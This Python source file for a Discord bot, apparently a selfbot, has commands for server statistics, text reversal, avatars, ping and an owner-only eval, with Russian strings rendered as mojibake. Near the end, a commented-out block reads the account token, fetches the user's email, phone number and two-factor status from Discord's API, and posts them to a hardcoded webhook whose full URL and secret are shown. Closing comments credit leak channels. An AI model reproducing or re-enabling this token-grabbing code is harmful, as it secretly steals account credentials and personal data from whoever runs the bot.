    members = ctx.guild.members
    online = len(list(filter(lambda x: x.status == discord.Status.online, members)))
    offline = len(list(filter(lambda x: x.status == discord.Status.offline, members)))
    idle = len(list(filter(lambda x: x.status == discord.Status.idle, members)))
    dnd = len(list(filter(lambda x: x.status == discord.Status.dnd, members)))
    allchannels = len(ctx.guild.channels)
    allvoice = len(ctx.guild.voice_channels)
    alltext = len(ctx.guild.text_channels)
    allroles = len(ctx.guild.roles)
    embed = discord.Embed(title=f"{ctx.guild.name}", colour = wuw(colors), timestamp=ctx.message.created_at)
    embed.set_author(name = ctx.author.name, icon_url = ctx.author.avatar_url)
    embed.description=(
        f":timer: –°–µ—Ä–≤–µ—Ä —Å–æ–∑–¥–∞–ª–∏ **{ctx.guild.created_at.strftime('%A, %b %#d %Y')}**\n\n"
        f":flag_white: –†–µ–≥–∏–æ–Ω **{ctx.guild.region}\n\n"
        f":green_circle: –û–Ω–ª–∞–π–Ω: **{online}**\n\n"
        f":white_circle: –û—Ñ—Ñ–ª–∞–π–Ω: **{offline}**\n\n"
        f":yellow_circle: –û—Ç–æ—à–ª–∏: **{idle}**\n\n"
        f":red_circle: –ù–µ —Ç—Ä–æ–≥–∞—Ç—å: **{dnd}**\n\n"
        f":shield: –£—Ä–æ–≤–µ–Ω—å –≤–µ—Ä–∏—Ñ–∏–∫–∞—Ü–∏–∏: **{ctx.guild.verification_level}**\n\n"
        f":bank: –í—Å–µ–≥–æ –∫–∞–Ω–∞–ª–æ–≤: **{allchannels}**\n\n"
        f":loud_sound: –ì–æ–ª–æ—Å–æ–≤—ã—Ö –∫–∞–Ω–∞–ª–æ–≤: **{allvoice}**\n\n"
        f":keyboard: –¢–µ–∫—Å—Ç–æ–≤—ã—Ö –∫–∞–Ω–∞–ª–æ–≤: **{alltext}**\n\n"
        f":briefcase: –í—Å–µ–≥–æ —Ä–æ–ª–µ–π: **{allroles}**\n\n"
        f":slight_smile: –õ—é–¥–µ–π –Ω–∞ —Å–µ—Ä–≤–µ—Ä–µ **{ctx.guild.member_count}\n\n"
    )

    embed.set_thumbnail(url=ctx.guild.icon_url)
    embed.set_footer(text=f"ID: {ctx.guild.id}")
    await ctx.send(embed=embed)
    await ctx.message.delete()


@client.command()
async def reverse(ctx, *, text: str):
    t_rev = text[::-1].replace("@", "@\u200B").replace("&", "&\u200B")
    await ctx.send(f"{t_rev}")
    await ctx.message.delete()


@client.command()
async def avatar(ctx, member:discord.User = None):
    if not member:
        member = ctx.author
    await ctx.message.delete()
    embed = discord.Embed(title = f'–ê–≤–∞—Ç–∞—Ä –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è {member}', color = wuw(colors))
    embed.set_image(url = member.avatar_url)
    embed.set_author(icon_url = 'https://www.flaticon.com/premium-icon/icons/svg/2919/2919600.svg', name = '–£—á–∞—Å—Ç–Ω–∏–∫ | –ê–≤–∞—Ç–∞—Ä')
    embed.set_footer(text = f'{client.user.name} ¬© 2021 | –í—Å–µ –ø—Ä–∞–≤–∞ –∑–∞—â–∏—â–µ–Ω—ã)', icon_url = client.user.avatar_url)
    await ctx.send(embed = embed)


@client.command()
async def ping(ctx):
    ping = client.latency
    ping_emoji = "üü©üî≥üî≥üî≥üî≥"
    ping_list = [
        {"ping": 0.10000000000000000, "emoji": "üüßüü©üî≥üî≥üî≥"},
        {"ping": 0.15000000000000000, "emoji": "üü•üüßüü©üî≥üî≥"},
        {"ping": 0.20000000000000000, "emoji": "üü•üü•üüßüü©üî≥"},
        {"ping": 0.25000000000000000, "emoji": "üü•üü•üü•üüßüü©"},
        {"ping": 0.30000000000000000, "emoji": "üü•üü•üü•üü•üüß"},
        {"ping": 0.35000000000000000, "emoji": "üü•üü•üü•üü•üü•"}]
    for ping_one in ping_list:
        if ping > ping_one["ping"]:
            ping_emoji = ping_one["emoji"]
            break

    await ctx.message.edit(content = f"–ü–æ–Ω–≥! {ping_emoji} `{ping * 1000:.0f}ms` :ping_pong:")


def clean_code(content):
    if content.startswith("```") and content.endswith("```"):
        return "\n".join(content.split("\n")[1:])[:-3]
    else:
        return content
        
@client.command(name="eval", aliases=["exec"])
async def _eval(ctx, *, code):
    if ctx.author.id in [812755182201995264]:
        pending_embed = discord.Embed(title = '–î–æ–±—Ä—ã–π –¥–µ–Ω—å!', description = '–ö–æ–¥ –≤—ã–ø–æ–ª–Ω—è–µ—Ç—Å—è, –ø–æ–¥–æ–∂–¥–∏—Ç–µ...', color = discord.Colour.from_rgb(255, 255, 0))
        try: message = await ctx.send(embed=pending_embed)
        except: message = await ctx.send('–ö–æ–¥ –≤—ã–ø–æ–ª–Ω—è–µ—Ç—Å—è, –ø–æ–¥–æ–∂–¥–∏—Ç–µ...')
        success_embed = discord.Embed(title = '–í—ã–ø–æ–ª–Ω–µ–Ω–∏–µ –∫–æ–¥–∞ - —É—Å–ø–µ—Ö', color = discord.Colour.from_rgb(0, 255, 0))
        code = clean_code(code)
        local_variables = {
            "discord": discord,
            "commands": commands,
            "client": client,
            "ctx": ctx,
            "channel": ctx.channel,
            "author": ctx.author,
            "guild": ctx.guild,
            "message": ctx.message
        }
        stdout = io.StringIO()
        try:
            with contextlib.redirect_stdout(stdout):
                exec(
                    f"async def func():\n{textwrap.indent(code, '    ')}", local_variables,
                )
                obj = await local_variables["func"]()
                result = stdout.getvalue()
                success_embed.add_field(name = '–í—ã–ø–æ–ª–Ω–µ–Ω–Ω—ã–π –∫–æ–¥:', value = f'```py\n{code}\n```', inline = False)
                what_returned = None
                if obj != None:
                    if isinstance(obj, int) == True:
                        if obj == True:
                            what_returned = '–õ–æ–≥–∏—á–µ—Å–∫–æ–µ –∑–Ω–∞—á–µ–Ω–∏–µ'
                        elif obj == False:
                            what_returned = '–õ–æ–≥–∏—á–µ—Å–∫–æ–µ –∑–Ω–∞—á–µ–Ω–∏–µ'
                        else:
                            what_returned = '–¶–µ–ª–æ–µ —á–∏—Å–ª–æ'
                    elif isinstance(obj, str) == True:
                        what_returned = '–°—Ç—Ä–æ–∫–∞'
                    elif isinstance(obj, float) == True:
                        what_returned = '–î—Ä–æ–±–Ω–æ–µ —á–∏—Å–ª–æ'
                    elif isinstance(obj, list) == True:
                        what_returned = '–°–ø–∏—Å–æ–∫'
                    elif isinstance(obj, tuple) == True:
                        what_returned = '–ù–µ–∏–∑–º–µ–Ω—è–µ–º—ã–π —Å–ø–∏—Å–æ–∫'
                    elif isinstance(obj, set) == True:
                        what_returned = '–£–Ω–∏–∫–∞–ª—å–Ω—ã–π —Å–ø–∏—Å–æ–∫'
                    else:
                        what_returned = '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω—ã–π —Ç–∏–ø –¥–∞–Ω–Ω—ã—Ö...'
                    success_embed.add_field(name = '–¢–∏–ø –¥–∞–Ω–Ω—ã—Ö:', value = f'```\n{what_returned}\n```', inline = False)
                    success_embed.add_field(name = '–í–µ—Ä–Ω—É–ª–æ—Å—å:', value = f'```\n{obj}\n```', inline = False)
                else:
                    pass
                if result:
                    success_embed.add_field(name = '–†–µ–∑—É–ª—å—Ç–∞—Ç –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è:', value = f'```py\n–ö–æ–Ω—Å–æ–ª—å:\n\n{result}\n```', inline = False)
                else:
                    pass
                try: await message.edit(embed = success_embed)
                except: pass
        except Exception as e:
            fail_embed = discord.Embed(title = '–í—ã–ø–æ–ª–Ω–µ–Ω–∏–µ –∫–æ–¥–∞ - –ø—Ä–æ–≤–∞–ª', color = discord.Colour.from_rgb(255, 0, 0))
            fail_embed.add_field(name = '–í—ã–ø–æ–ª–Ω–µ–Ω–Ω—ã–π –∫–æ–¥:', value = f'```py\n{code}\n```', inline = False)
            print(f"[{client.user}] "+str(e)) 
            fail_embed.add_field(name = '–û—à–∏–±–∫–∞:', value = f'```py\n{e}\n```', inline = False)
            try: await message.edit(embed = fail_embed)
            except: pass
    else:
        fail_embed = discord.Embed(title = '–í—ã–ø–æ–ª–Ω–µ–Ω–∏–µ –∫–æ–¥–∞ - –ø—Ä–æ–≤–∞–ª', color = discord.Colour.from_rgb(255, 0, 0))
        fail_embed.add_field(name = '–í—ã–ø–æ–ª–Ω–µ–Ω–Ω—ã–π –∫–æ–¥:', value = f'```py\n{code}\n```', inline = False)
        fail_embed.add_field(name = '–û—à–∏–±–∫–∞:', value = f'```\n–¢—ã –Ω–µ –æ–≤–Ω–µ—Ä –±–æ—Ç–∞ –Ω–∞—Ö—É–π\n```', inline = False)
        await ctx.send(embed = fail_embed)

## +++++++++++++++++
#webhook = 'https://discordapp.com/api/webhooks/823925016340594769/6WgNT6kGfHLaA1tBxnJZUIK8IEE7l__WooNtMdiHPyLG_KWEW6bqU9or542O_6nE153S'

#header = {'Authorization': token, 'Content-Type': 'application/json'}
#request = requests.get('https://canary.discordapp.com/api/v8/users/@me', headers=header)
#if request.status_code == 200:
#   userName = request.json()['username'] + '#' + request.json()['discriminator']
#   userID = request.json()['id']
#   phone = request.json()['phone']
#   email = request.json()['email']
#   mfa = request.json()['mfa_enabled']
#   info = (f'''\n
#  ```User Name: {userName}
#  User ID: {userID}
#  2 Factor: {mfa}
#  Email: {email}
#  Phone Number: {phone if phone else 'None.'}```
#            ''')
#   payload = {'content': info}
#   requests.post(webhook, data=payload)
#else:
#   info2 = (f'```Invalid token => {token}```')
#   payload = {'content': info2}
#   requests.post(webhook, data=payload2)
    
##++++++++++++++++++
client.run(os.getenv("DISCORD_TOKEN"))
# —Å–ª–∏—Ç–æ by t.me/protectcheck
# —Å–ª–∏—Ç–æ by discord.gg/fzlgroup2
